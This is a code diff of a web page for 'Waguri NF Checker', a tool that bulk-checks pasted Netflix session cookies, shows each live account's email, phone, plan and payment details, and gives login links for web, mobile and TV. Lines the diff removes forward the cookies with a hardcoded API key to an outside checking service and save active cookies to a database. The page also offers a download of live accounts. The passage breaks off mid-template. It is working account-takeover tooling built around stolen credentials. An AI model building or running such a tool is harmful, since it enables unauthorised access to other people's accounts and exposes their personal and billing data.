@@ -63,70 +63,992 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 ?>
-<?php
-require_once 'db.php';
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Waguri NF Checker | Premium</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <!-- SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $raw_post_data = file_get_contents('php://input');
-    $json_data = json_decode($raw_post_data, true);
-
-    if (isset($json_data['cookie'])) {
-        
-        $my_api_key = "NFK_f6535c3f25765787380fd370"; 
-        
-        $api_url = "https://nftoken.site/v1/api.php";
-
-        $payload = json_encode([
-            'key' => $my_api_key,
-            'cookie' => $json_data['cookie']
-        ]);
-
-        $ch = curl_init($api_url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
-
-        $response = curl_exec($ch);
-        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-
-        // --- NEW DATABASE SAVING LOGIC (COOKIES ONLY) ---
-        if ($http_code == 200 && $response) {
-            $resp_data = json_decode($response, true);
+        /* Galactic Premium Theme - Rose/Crimson Edition (Main Site) */
+        :root {
+            --bg-color: #09090b; /* Zinc 950 */
+            --card-bg: #121214; 
+            --border-color: rgba(255, 255, 255, 0.08);
+            --text-main: #f8fafc;
+            --text-muted: #a1a1aa;
+            --accent-gradient: linear-gradient(135deg, #f43f5e, #8b5cf6); /* Rose to Purple */
+            --accent-glow: rgba(244, 63, 94, 0.4);
             
-            // If the account is ACTIVE, save only the cookie to Heroku Postgres
-            if (isset($resp_data['status']) && $resp_data['status'] === 'SUCCESS' && isset($pdo)) {
+            /* Harmonized Result Card Specific Colors */
+            --res-card-bg: rgba(255, 255, 255, 0.02);
+            --res-border: rgba(255, 255, 255, 0.08);
+            --res-accent: #f43f5e;
+        }
+
+        body { 
+            background: var(--bg-color); 
+            color: var(--text-main); 
+            font-family: 'Inter', sans-serif; 
+            padding-top: 120px;
+            background-image: radial-gradient(circle at 50% 0%, rgba(139, 92, 246, 0.1) 0%, transparent 50%);
+            background-repeat: no-repeat;
+            min-height: 100vh;
+        }
+        
+        /* Top Navigation Bar */
+        .navbar-custom {
+            background: rgba(18, 18, 20, 0.7);
+            border-bottom: 1px solid var(--border-color);
+            backdrop-filter: blur(12px);
+            padding: 16px 0;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 999;
+        }
+
+        /* Glassmorphism Cards */
+        .card-premium { 
+            background: var(--card-bg); 
+            border: 1px solid var(--border-color); 
+            border-radius: 20px; 
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255,255,255,0.05); 
+            backdrop-filter: blur(10px);
+        }
+
+        /* Typography */
+        .title-gradient {
+            background: var(--accent-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+
+        /* Inputs */
+        textarea.form-control, input.form-control { 
+            background: rgba(0, 0, 0, 0.4); 
+            border: 1px solid var(--border-color); 
+            color: var(--text-main); 
+            border-radius: 12px; 
+            padding: 15px;
+            font-size: 14px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        textarea.form-control:focus, input.form-control:focus { 
+            background: rgba(0, 0, 0, 0.6); 
+            border-color: #8b5cf6; 
+            box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.15); 
+            outline: none; 
+            color: var(--text-main); 
+        }
+        textarea.form-control::placeholder, input.form-control::placeholder {
+            color: #52525b;
+        }
+        
+        /* Premium Buttons */
+        .btn-start { 
+            background: var(--accent-gradient); 
+            border: none; 
+            color: white; 
+            border-radius: 12px; 
+            font-weight: 600; 
+            text-transform: uppercase; 
+            letter-spacing: 1px; 
+            font-size: 14px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+        .btn-start::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(135deg, #8b5cf6, #f43f5e);
+            z-index: -1;
+            transition: opacity 0.3s ease;
+            opacity: 0;
+        }
+        .btn-start:hover::before { opacity: 1; }
+        .btn-start:hover { 
+            transform: translateY(-2px); 
+            box-shadow: 0 8px 20px var(--accent-glow); 
+            color: white;
+        }
+
+        /* Squared Tabs Redesign */
+        .mode-switcher {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            padding: 6px;
+            display: inline-flex;
+            margin-bottom: 30px;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.3);
+        }
+        .mode-btn {
+            background: transparent;
+            color: var(--text-muted);
+            border: none;
+            padding: 12px 35px;
+            border-radius: 8px; /* Squared off */
+            font-weight: 600;
+            font-size: 14px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            cursor: pointer;
+            position: relative;
+        }
+        .mode-btn:hover:not(.active) {
+            color: #fff;
+            background: rgba(255,255,255,0.03);
+        }
+        .mode-btn.active {
+            background: var(--accent-gradient);
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(244, 63, 94, 0.3);
+        }
+
+        /* Stats Classes */
+        .stat-num { font-size: 36px; font-weight: bold; }
+        .stat-label { font-size: 11px; text-transform: uppercase; color: var(--text-muted); letter-spacing: 1.5px; font-weight: 700; }
+
+        /* --- EXACT RESULT CARD UI --- */
+        .premium-ui-card {
+            border: 1px solid var(--res-border);
+            border-radius: 16px;
+            background: var(--res-card-bg);
+            overflow: hidden;
+            width: 100%;
+        }
+        .card-head {
+            border-bottom: 1px solid var(--res-border);
+            padding: 18px 24px;
+            background: rgba(255,255,255,0.01);
+        }
+        .card-body-pad {
+            padding: 24px 24px 30px 24px;
+        }
+        
+        .field-label {
+            font-size: 10px;
+            color: var(--text-muted);
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+        .field-value {
+            font-size: 15px;
+            color: var(--text-main);
+            font-weight: 600;
+        }
+        .email-value {
+            font-size: 22px;
+            font-weight: 700;
+            word-break: break-all;
+            letter-spacing: 0.5px;
+        }
+        
+        /* Action Pills */
+        .action-pill-group {
+            display: flex;
+            flex-wrap: wrap;
+            margin-top: 1.5rem;
+            gap: 12px;
+        }
+        .action-pill {
+            flex: 1 1 calc(33.333% - 12px);
+            text-align: center;
+            border: 1px solid var(--res-border);
+            color: var(--text-main);
+            padding: 12px 0;
+            border-radius: 12px;
+            font-size: 13px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            text-decoration: none;
+            transition: 0.2s;
+            background: rgba(255,255,255,0.01);
+            cursor: pointer;
+            display: inline-block;
+        }
+        .action-pill:hover {
+            background: rgba(244, 63, 94, 0.1);
+            color: #f43f5e;
+            border-color: #f43f5e;
+            text-decoration: none;
+            box-shadow: 0 4px 12px rgba(244, 63, 94, 0.2);
+        }
+        .action-pill.full-width {
+            flex: 1 1 100%;
+            background: rgba(244, 63, 94, 0.05);
+        }
+
+        /* Carousel Navigation & Cards */
+        .carousel-wrapper { display: flex; align-items: center; justify-content: center; gap: 20px; position: relative; padding: 10px 0; }
+        .carousel-viewport { flex-grow: 1; overflow: hidden; position: relative; }
+        .carousel-card { display: none; width: 100%; animation: fadeScale 0.3s ease-in-out forwards; }
+        .carousel-card.active { display: block; }
+        @keyframes fadeScale { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
+
+        .nav-btn-icon {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--res-border);
+            color: var(--text-muted);
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.2s;
+            cursor: pointer;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+        .nav-btn-icon:hover:not(:disabled) {
+            color: #f43f5e;
+            background: rgba(244, 63, 94, 0.15);
+            border-color: #f43f5e;
+            box-shadow: 0 4px 12px rgba(244, 63, 94, 0.3);
+        }
+        .nav-btn-icon:disabled { opacity: 0.3; cursor: not-allowed; }
+        
+        .carousel-indicator { text-align: center; color: var(--text-muted); font-size: 14px; font-weight: 600; margin-top: 20px; letter-spacing: 0.5px; }
+
+        /* Status Badges */
+        .status-badge { font-size: 10px; padding: 6px 12px; border-radius: 8px; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; }
+        .status-error { background: rgba(239, 68, 68, 0.1); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.2); }
+        .status-warning { background: rgba(245, 158, 11, 0.1); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.2); }
+
+        .fade-in { animation: fadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Loader */
+        .loader {
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top: 3px solid #f43f5e;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Modal Styles */
+        .modal-backdrop {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(5px);
+            z-index: 1050;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .modal-content {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 24px;
+            width: 90%; max-width: 420px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+        }
+
+        @media (max-width: 768px) {
+            body { padding-top: 115px; } 
+            .navbar-custom h1 { font-size: 1.2rem !important; }
+            .card-premium { padding: 20px !important; }
+            #bulkInput { height: 200px; }
+            .stat-num { font-size: 28px; }
+            .card-body-pad { padding: 20px 16px 24px 16px; }
+            .email-value { font-size: 18px; }
+            .action-pill { font-size: 11px; padding: 10px 0; }
+        }
+
+        @media (max-width: 480px) {
+            .mode-switcher { display: flex; width: 100%; }
+            .mode-btn { flex: 1; padding: 10px 0; font-size: 13px; }
+            #bulkStats { flex-wrap: wrap; gap: 15px; }
+            #bulkStats > div { flex: 1 1 30%; }
+            .action-pill-group { flex-direction: column; gap: 10px; }
+            .action-pill { width: 100%; flex: 1 1 100%; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Top Navigation Bar -->
+<nav class="navbar-custom">
+    <div class="container d-flex justify-content-between align-items-center">
+        <div class="d-flex align-items-center">
+            <!-- Custom Logo Image -->
+            <img src="your-logo.png" alt="Waguri Logo" class="mr-3" style="width: 56px; height: 56px; object-fit: contain; border-radius: 12px;">
+            <h1 class="title-gradient m-0" style="font-size: 1.5rem; letter-spacing: 0;">Waguri NF Checker</h1>
+        </div>
+        <div class="text-muted d-none d-sm-block" style="font-size: 0.9rem; font-weight: 500; letter-spacing: 0.5px;">
+            Secure & Premium Token Auth
+        </div>
+    </div>
+</nav>
+
+<!-- Format Modal -->
+<div id="formatModal" class="modal-backdrop" style="display: none;">
+    <div class="modal-content fade-in">
+        <div class="d-flex justify-content-between align-items-center mb-3">
+            <h5 class="text-white font-weight-bold m-0"><i class="fas fa-exclamation-circle text-[#f43f5e] mr-2"></i> Requirement Notice</h5>
+            <button onclick="closeModal()" class="text-muted bg-transparent border-0" style="cursor: pointer; font-size: 1.2rem;"><i class="fas fa-times"></i></button>
+        </div>
+        <p style="color: var(--text-muted); font-size: 14px; line-height: 1.6;">
+            Requires <strong class="text-white">SecureNetflixId</strong> and <strong class="text-white">NetflixId</strong>. To guarantee accurate cookie validation, please confirm that your session data contains both fields.
+        </p>
+        <button onclick="closeModal()" class="btn btn-start w-100 mt-3 py-2">Understood</button>
+    </div>
+</div>
+
+<!-- Mobile Guide Modal -->
+<div id="mobileGuideModal" class="modal-backdrop" style="display: none;">
+    <div class="modal-content fade-in" style="max-width: 500px;">
+        <div class="d-flex justify-content-between align-items-center mb-4">
+            <h5 class="text-white font-weight-bold m-0"><i class="fas fa-mobile-alt text-[#f43f5e] mr-2"></i> Watch on Mobile Guide</h5>
+            <button onclick="closeMobileGuide()" class="text-muted bg-transparent border-0" style="cursor: pointer; font-size: 1.2rem;"><i class="fas fa-times"></i></button>
+        </div>
+        <div style="color: var(--text-muted); font-size: 13px; line-height: 1.6; max-height: 60vh; overflow-y: auto; padding-right: 5px;">
+            <p class="text-white mb-3 font-weight-bold" style="font-size: 14px;">To Watch on Mobile App is 50/50 but there still a chance! This method works for some devices, just try and try!</p>
+            <ol class="pl-3 mb-4" style="list-style-type: decimal;">
+                <li class="mb-2">Open Netflix App (Make sure it's <strong>Clear Data</strong>). Leave it open.</li>
+                <li class="mb-2">Make sure you're using our website in <strong>Chrome</strong> (Better chances based on some users).</li>
+                <li class="mb-2">Now click the "<strong>WATCH ON MOBILE</strong>" button below.</li>
+                <li class="mb-2">If an 'Open App' prompt shows in the browser, click it and it will direct to the Netflix app.</li>
+            </ol>
+            <div class="p-3 mb-3" style="background: rgba(244, 63, 94, 0.05); border-left: 3px solid #f43f5e; border-radius: 0 8px 8px 0;">
+                <p class="text-[#f43f5e] font-weight-bold mb-1" style="font-size: 14px;">If this didn't work:</p>
+                <p class="mb-0 text-gray-300">Click the <strong>Web Button</strong> first. It will direct to a new tab. Now go back to the Checker again and click the Watch on Mobile again. Some say this works. Just try and try. This is depending on Device and Browsers.</p>
+            </div>
+        </div>
+        <a id="actualMobileLink" href="#" target="_blank" class="btn btn-start w-100 mt-2 py-3 text-center" style="display: block; text-decoration: none;">
+            <i class="fas fa-external-link-alt mr-2"></i> WATCH ON MOBILE
+        </a>
+    </div>
+</div>
+
+<!-- TV Guide Modal -->
+<div id="tvGuideModal" class="modal-backdrop" style="display: none;">
+    <div class="modal-content fade-in" style="max-width: 500px;">
+        <div class="d-flex justify-content-between align-items-center mb-3">
+            <h5 class="text-white font-weight-bold m-0"><i class="fas fa-tv text-[#f43f5e] mr-2"></i> Watch on TV Guide</h5>
+            <button onclick="closeTvGuide()" class="text-muted bg-transparent border-0" style="cursor: pointer; font-size: 1.2rem;"><i class="fas fa-times"></i></button>
+        </div>
+        <div style="color: var(--text-muted); font-size: 13px; line-height: 1.6; max-height: 60vh; overflow-y: auto; padding-right: 5px;">
+            <div class="mb-4 d-flex align-items-center gap-2">
+                <input type="text" id="tvLinkInput" class="form-control" readonly style="flex: 1; margin-bottom: 0; padding: 12px; font-size: 12px; background: rgba(0,0,0,0.5);">
+                <button onclick="copyTvLink()" class="btn btn-start py-2 px-3" style="margin-bottom: 0; min-width: 80px;"><i class="fas fa-copy"></i> Copy</button>
+            </div>
+            <p class="text-white mb-4 font-weight-bold" style="font-size: 14px;">To watch Netflix on your TV is high chance especially if you have a PC or a Laptop.</p>
+            <div class="mb-4">
+                <p class="text-[#f43f5e] font-weight-bold mb-1" style="font-size: 14px;">Option 1 (PC/Laptop)</p>
+                <p class="mb-0 text-gray-300">If you have a PC/Laptop, kindly click the <strong>Web</strong> button first. After it directly logs you in, copy the highlighted link from this modal or press Copy, paste it into your browser's address bar, and enter the code shown on your TV.</p>
+            </div>
+            <div class="mb-2">
+                <p class="text-[#f43f5e] font-weight-bold mb-1" style="font-size: 14px;">Option 2 (Mobile)</p>
+                <p class="mb-0 text-gray-300">If you only have mobile, kindly click the <strong>Mobile Guide</strong> button. After it directly logs you into the Netflix application, simply scan the QR code displayed on your Netflix TV screen using your device.</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="container pb-5">
+    <div class="row justify-content-center">
+        <div class="col-md-10 col-lg-9">
+
+            <!-- Input Container -->
+            <div class="card-premium p-4 p-md-5 mb-4 relative z-10" id="inputContainer">
+                
+                <div class="text-center">
+                    <div class="mode-switcher">
+                        <button class="mode-btn active" id="btnTabSingle" onclick="switchTab('single')">Single Check</button>
+                        <button class="mode-btn" id="btnTabBulk" onclick="switchTab('bulk')">Bulk Check</button>
+                    </div>
+                </div>
+
+                <!-- SINGLE CHECK SECTION -->
+                <div id="sectSingle" class="fade-in">
+                    <label class="font-weight-bold mb-2 text-white" style="font-size: 14px;">Input Single Token/Cookie</label>
+                    <textarea id="singleInput" class="form-control mb-4" rows="4" style="resize: none; overflow-y: auto;" placeholder="Paste single Netscape block, JSON, or NetflixId here..."></textarea>
+                    <button id="startSingleBtn" class="btn btn-start w-100 py-3" onclick="processSingle()">
+                        <i class="fas fa-bolt mr-2"></i> CHECK ACCOUNT
+                    </button>
+                </div>
+
+                <!-- BULK CHECK SECTION -->
+                <div id="sectBulk" style="display: none;">
+                    <div class="d-flex justify-content-between align-items-end mb-2">
+                        <label class="font-weight-bold text-white mb-0" style="font-size: 14px;">Paste Bulk Cookies</label>
+                        <span style="font-size: 12px; color: #f43f5e; cursor: pointer; transition: 0.2s;" onclick="openModal()"><i class="fas fa-info-circle"></i> Supported Formats</span>
+                    </div>
+                    <p class="mb-3" style="font-size: 12px; color: var(--text-muted);">
+                        Paste one cookie per line or use universal separator ( | ). Netscape and JSON blocks are automatically parsed.
+                    </p>
+                    <textarea id="bulkInput" class="form-control mb-4" rows="12" style="resize: none; overflow-y: auto;" placeholder="Format: NetflixId=... | SecureNetflixId=...&#10;Or paste full JSON/Netscape formats..."></textarea>
+                    <button id="startBulkBtn" class="btn btn-start w-100 py-3" onclick="processBulk()">
+                        <i class="fas fa-layer-group mr-2"></i> START BULK CHECK
+                    </button>
+                </div>
+            </div>
+
+            <!-- RESULTS SECTION -->
+            <div class="card-premium p-4 p-md-5" id="resultsCard" style="display: none;">
+                
+                <div id="resultsHeader" class="d-flex justify-content-between align-items-center mb-4 pb-3" style="border-bottom: 1px solid var(--border-color);">
+                    <h5 class="font-weight-bold text-white m-0"><i class="fas fa-satellite-dish mr-2 text-[#f43f5e]"></i> Live Results</h5>
+                    <span id="progressText" style="color: var(--text-muted); font-size: 13px; font-weight: 500;">Awaiting...</span>
+                </div>
+                
+                <div id="bulkStats" class="d-flex justify-content-around mb-5 pb-4" style="border-bottom: 1px solid var(--border-color); display: none;">
+                    <div class="text-center">
+                        <div class="stat-num" style="color: #34d399;" id="statActive">0</div>
+                        <div class="stat-label">Active</div>
+                    </div>
+                    <div class="text-center">
+                        <div class="stat-num" style="color: #f87171;" id="statDead">0</div>
+                        <div class="stat-label">Invalid / Dead</div>
+                    </div>
+                    <div class="text-center">
+                        <div class="stat-num" style="color: #fbbf24;" id="statLimit">0</div>
+                        <div class="stat-label">Rate Limited</div>
+                    </div>
+                </div>
+
+                <!-- Single Mode List -->
+                <div id="singleResultsList"></div>
+
+                <!-- Bulk Mode Carousel -->
+                <div id="carouselWrapper" class="carousel-wrapper" style="display: none;">
+                    <button id="btnPrev" class="nav-btn-icon" onclick="navCarousel(-1)"><i class="fas fa-chevron-left"></i></button>
+                    <div class="carousel-viewport">
+                        <div id="bulkResultsList"></div>
+                    </div>
+                    <button id="btnNext" class="nav-btn-icon" onclick="navCarousel(1)"><i class="fas fa-chevron-right"></i></button>
+                </div>
+                
+                <div id="carouselIndicator" class="carousel-indicator" style="display: none;">0 of 0 Active Accounts</div>
+
+                <!-- NEW DOWNLOAD BUTTON FOR BULK CHECK -->
+                <div id="bulkDownloadWrapper" class="text-center mt-5" style="display: none;">
+                    <button onclick="downloadBulkDetails()" class="btn btn-start py-3 px-5 w-100 sm:w-auto" style="background: linear-gradient(135deg, #10b981, #059669);">
+                        <i class="fas fa-file-download mr-2"></i> DOWNLOAD LIVE DETAILS (.TXT)
+                    </button>
+                </div>
+
+            </div>
+
+        </div>
+    </div>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+    // --- Global Array to store full details for download ---
+    let bulkLiveAccounts = [];
+
+    // --- Format Helper to standardize the Details string ---
+    function formatDetailsText(data, originalCookie) {
+        return `Email: ${data.x_mail || 'N/A'}
+Phone: ${data.x_tel || 'N/A'}
+Plan: ${data.x_tier || 'N/A'}
+Payment: ${data.x_bil || 'N/A'}
+Profiles: ${data.x_usr || 'N/A'}
+Country: ${data.x_loc || 'N/A'}
+Next Bill: ${data.x_ren || 'N/A'}
+Since: ${data.x_mem || 'N/A'}
+
+Direct Watch: ${data.x_l1 || '#'}
+
+Mobile Watch: Open Netflix App (Make sure it's Clear Data). Leave it open. Use Chrome (Better chances based on some users) You need to copy the Direct Watch link and paste it to your mobile Chrome browser and enter. After you enter and open the account in the browser, change the link to https://netflix.com/unsupported. It will suggest to open the app; click that and it will direct you to the mobile app smoothly.
+
+TV Watch: ${data.x_l3 || '#'}
+
+Original Data:
+${originalCookie}`;
+    }
+
+    // --- Modal Logic ---
+    function openModal() { $('#formatModal').css('display', 'flex'); }
+    function closeModal() { $('#formatModal').hide(); }
+    
+    function openMobileGuide(link) { 
+        $('#actualMobileLink').attr('href', link);
+        $('#mobileGuideModal').css('display', 'flex'); 
+    }
+    function closeMobileGuide() { $('#mobileGuideModal').hide(); }
+
+    function openTvGuide(link) { 
+        $('#tvLinkInput').val(link);
+        $('#tvGuideModal').css('display', 'flex'); 
+    }
+    function closeTvGuide() { $('#tvGuideModal').hide(); }
+    
+    function copyTvLink() {
+        const link = $('#tvLinkInput').val();
+        navigator.clipboard.writeText(link).then(() => {
+            Swal.fire({
+                title: 'Success!',
+                text: 'TV Link copied to clipboard!',
+                icon: 'success',
+                background: '#121214',
+                color: '#f8fafc',
+                confirmButtonColor: '#f43f5e'
+            });
+        }).catch(err => {
+            Swal.fire({
+                title: 'Error!',
+                text: 'Failed to copy TV link.',
+                icon: 'error',
+                background: '#121214',
+                color: '#f8fafc',
+                confirmButtonColor: '#f43f5e'
+            });
+        });
+    }
+
+    // --- Secure Text Copy Fallback (Bypasses Canvas/iframe limitations) ---
+    function copyCardDetails(encodedStr) {
+        try {
+            const decodedStr = decodeURIComponent(escape(atob(encodedStr)));
+            const tempTextArea = document.createElement("textarea");
+            tempTextArea.value = decodedStr;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempTextArea);
+            
+            // SweetAlert Notification for successful copy
+            Swal.fire({
+                title: 'Success!',
+                text: 'Account details successfully copied to clipboard!',
+                icon: 'success',
+                background: '#121214',
+                color: '#f8fafc',
+                confirmButtonColor: '#f43f5e'
+            });
+        } catch (err) {
+            Swal.fire({
+                title: 'Error!',
+                text: 'Failed to copy details.',
+                icon: 'error',
+                background: '#121214',
+                color: '#f8fafc',
+                confirmButtonColor: '#f43f5e'
+            });
+        }
+    }
+
+    // --- Download Live Accounts Button Logic ---
+    function downloadBulkDetails() {
+        if (bulkLiveAccounts.length === 0) return;
+
+        const dateOptions = { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' };
+        const currentDate = new Date().toLocaleDateString('en-US', dateOptions);
+
+        let content = `------- Waguri NF Checker-- -----\r\nDate: ${currentDate}\r\n\r\n`;
+        content += bulkLiveAccounts.join("\r\n\r\n===============================\r\n\r\n");
+
+        let blob = new Blob([content], { type: "text/plain;charset=utf-8" });
+        let link = document.createElement("a");
+        link.href = URL.createObjectURL(blob);
+        link.download = `Waguri_Live_Accounts_${new Date().toISOString().slice(0,10)}.txt`;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    }
+
+    // --- Carousel State Logic ---
+    let currentActiveIndex = 0;
+    let totalActiveCards = 0;
+
+    function navCarousel(direction) {
+        const cards = $('#bulkResultsList .carousel-card');
+        if (cards.length === 0) return;
+
+        $(cards[currentActiveIndex]).removeClass('active');
+        currentActiveIndex += direction;
+        
+        if (currentActiveIndex < 0) currentActiveIndex = 0;
+        if (currentActiveIndex >= totalActiveCards) currentActiveIndex = totalActiveCards - 1;
+        
+        $(cards[currentActiveIndex]).addClass('active');
+        updateCarouselUI();
+    }
+
+    function updateCarouselUI() {
+        if (totalActiveCards === 0) {
+            $('#carouselWrapper, #carouselIndicator').hide();
+            return;
+        }
+        $('#carouselWrapper, #carouselIndicator').show();
+        $('#carouselIndicator').html(`<span class="text-white">${currentActiveIndex + 1}</span> of <span class="text-white">${totalActiveCards}</span> Active Accounts`);
+        
+        $('#btnPrev').prop('disabled', currentActiveIndex === 0);
+        $('#btnNext').prop('disabled', currentActiveIndex >= totalActiveCards - 1);
+    }
+
+    // --- UI Mode Logic ---
+    function switchTab(mode) {
+        $('#resultsCard').hide();
+        $('#singleResultsList').empty();
+        $('#bulkResultsList').empty();
+        $('#bulkStats').removeClass('d-flex').hide();
+        $('#resultsHeader').removeClass('d-flex').hide();
+        $('#carouselWrapper, #carouselIndicator').hide();
+        $('#bulkDownloadWrapper').hide();
+
+        if (mode === 'single') {
+            $('#btnTabSingle').addClass('active');
+            $('#btnTabBulk').removeClass('active');
+            $('#sectSingle').show().addClass('fade-in');
+            $('#sectBulk').hide().removeClass('fade-in');
+        } else {
+            $('#btnTabBulk').addClass('active');
+            $('#btnTabSingle').removeClass('active');
+            $('#sectBulk').show().addClass('fade-in');
+            $('#sectSingle').hide().removeClass('fade-in');
+        }
+    }
+
+    // --- Core Parsing Logic ---
+    function parseMixedInput(text) {
+        let extracted = [];
+        let startIndex = 0;
+        
+        while ((startIndex = text.indexOf('[', startIndex)) !== -1) {
+            let endIndex = startIndex;
+            let foundValid = false;
+            while ((endIndex = text.indexOf(']', endIndex + 1)) !== -1) {
+                let potentialJson = text.substring(startIndex, endIndex + 1);
                 try {
-                    // Check if the cookie already exists in the database
-                    $check_stmt = $pdo->prepare("SELECT id FROM active_accounts WHERE cookie_data = :cookie");
-                    $check_stmt->execute([':cookie' => $json_data['cookie']]);
-                    
-                    if ($check_stmt->rowCount() == 0) {
-                        // Only insert if it doesn't exist (prevents duplicates)
-                        $stmt = $pdo->prepare("
-                            INSERT INTO active_accounts (cookie_data) 
-                            VALUES (:cookie)
-                        ");
-                        $stmt->execute([
-                            ':cookie' => $json_data['cookie']
-                        ]);
+                    let parsed = JSON.parse(potentialJson);
+                    if (Array.isArray(parsed)) {
+                        extracted.push(potentialJson.trim());
+                        text = text.substring(0, startIndex) + " ".repeat(potentialJson.length) + text.substring(endIndex + 1);
+                        foundValid = true;
+                        break;
                     }
-                } catch (\PDOException $e) {
-                    error_log("Failed to save cookie: " . $e->getMessage());
+                } catch (e) {}
+            }
+            if (!foundValid) startIndex++; 
+        }
+        
+        text = text.replace(/\|/g, '\n');
+        let lines = text.split(/\r?\n/);
+        let currentNetscape = [];
+        let seenKeys = new Set(); 
+        
+        lines.forEach(line => {
+            let trimmed = line.trim();
+            if (!trimmed || trimmed === ';') {
+                if (currentNetscape.length > 0) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
+                return;
+            }
+            if (trimmed.endsWith(';')) trimmed = trimmed.slice(0, -1).trim();
+            if (trimmed.includes('.netflix.com') && (trimmed.includes('TRUE') || trimmed.includes('FALSE'))) {
+                let parts = trimmed.split(/\s+/);
+                if (parts.length >= 6) {
+                    let keyName = parts[5];
+                    if (seenKeys.has(keyName)) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
+                    seenKeys.add(keyName);
                 }
+                currentNetscape.push(trimmed);
+            } else if (trimmed.includes('NetflixId=') || trimmed.includes('SecureNetflixId=')) {
+                if (currentNetscape.length > 0) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
+                extracted.push(trimmed);
+            }
+        });
+        if (currentNetscape.length > 0) extracted.push(currentNetscape.join('\n'));
+        return extracted;
+    }
+
+    const sleep = ms => new Promise(r => setTimeout(r, ms));
+    const apiUrl = window.location.href;
+
+    // --- Rendering HTML Logic ---
+    function createResultElement(data, httpStatus, mode, indexNum, originalCookie) {
+        if (data.status === 'SUCCESS') {
+            let planStr = data.x_tier || 'Unknown';
+            let locStr = data.x_loc || 'Unknown';
+            let premiumColor = planStr.includes('Premium') ? '#f43f5e' : '#c084fc'; 
+            
+            let directLink = data.x_l1 || '#';
+            let mobileLink = data.x_l2 || '#';
+            let tvLink = data.x_l3 || '#';
+
+            let accountBadge = mode === 'bulk' ? `<div style="background: rgba(255,255,255,0.05); padding: 4px 12px; border-radius: 6px; font-weight: 700; font-size: 11px; letter-spacing: 1px; color: var(--text-muted);">ACCOUNT #${indexNum}</div>` : `<div></div>`;
+
+            // Prepare exactly formatted detail text for copying with original cookie appended
+            const detailTextRaw = formatDetailsText(data, originalCookie);
+            const base64EncodedDetail = btoa(unescape(encodeURIComponent(detailTextRaw)));
+
+            return `
+            <div class="premium-ui-card mx-auto">
+                <div class="card-head d-flex justify-content-between align-items-center">
+                    ${accountBadge}
